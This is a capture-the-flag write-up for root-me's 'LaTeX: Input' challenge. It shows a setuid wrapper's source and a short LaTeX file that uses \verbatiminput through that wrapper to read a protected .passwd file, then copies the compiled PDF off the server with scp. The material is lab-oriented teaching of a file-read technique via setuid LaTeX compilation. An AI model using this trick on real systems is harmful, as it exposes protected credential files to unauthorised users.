# LaTeX: Input

[root-me challenge: LaTeX-Input](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Input): Do you know how the input command works?

----

```text
/tmp and /var/tmp are writeable

Validation password is stored in $HOME/.passwd

Useful commands available:
    python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, gdb-pwndbg, ROPgadget, radare2

Attention:
    Publishing solutions publicly (blog, github, youtube, etc.) is forbidden.
    Publier des solutions publiquement (blog, github, youtube, etc.) est interdit.
```

The solution is not given here. The flow to get it is. 

```text
$ ls -la
total 676
drwxr-x---  2 app-script-ch23-cracked app-script-ch23           4096 Dec 10  2021 .
drwxr-xr-x 24 root                    root                      4096 Mar 22 15:29 ..
-r-xr-x---  1 app-script-ch23-cracked app-script-ch23            893 Dec 10  2021 ch23.sh
-rw-r-----  1 root                    root                        43 Dec 10  2021 .git
-r--------  1 app-script-ch23-cracked app-script-ch23-cracked     93 Dec 10  2021 .passwd
-r--------  1 root                    root                       802 Dec 10  2021 ._perms
-rwsr-x---  1 app-script-ch23-cracked app-script-ch23         661788 Dec 10  2021 setuid-wrapper
-r--r-----  1 app-script-ch23-cracked app-script-ch23            262 Dec 10  2021 setuid-wrapper.c
```

```text
$ cat setuid-wrapper.c
#include <unistd.h>

/* setuid script wrapper */

int main(int arc, char** arv) {
    char *argv[] = { "/bin/bash", "-p", "/challenge/app-script/ch23/ch23.sh", arv[1] , NULL };
    setreuid(geteuid(), geteuid());
    execve(argv[0], argv, NULL);
    return 0;
}
```

```text
$ pwd
/challenge/app-script/ch23
```

After several attempts using the hacks from the resources given, I decided to look in other directions and made a swerve to [GTFOBins pdflatex](https://gtfobins.github.io/gtfobins/pdflatex/), applying it in this `/tmp/article.tex`:

```text
\documentclass{article}
\usepackage{verbatim}
\begin{document}
\verbatiminput{/challenge/app-script/ch23/.passwd}
\end{document}
```

Then created `main.pdf` using the `setuid-wrapper` binary:

```text
$ ~/setuid-wrapper /tmp/article.tex
```

And extracted the resulting `.pdf` file to the local machine using `scp`. Mind to change the `/path/to/` to the results:

    $ scp -P 2222 app-script-ch23@challenge02.root-me.org:</path/to/>main.pdf /home/kali/Downloads/

Lo and behold. Finally! It contained the flag (leave out the `%`).

## Resources

* [Latex Global](https://repository.root-me.org/Programmation/Latex/FR%20-%20Latex%20Global.pdf)
* [Latex Cheat Sheet](https://repository.root-me.org/Programmation/Latex/EN%20-%20Latex%20Cheat%20Sheet.pdf)
* [Latex Guide](https://repository.root-me.org/Programmation/Latex/EN%20-%20Latex%20Guide.pdf)
* [Hacking with LaTeX](https://0day.work/hacking-with-latex/)
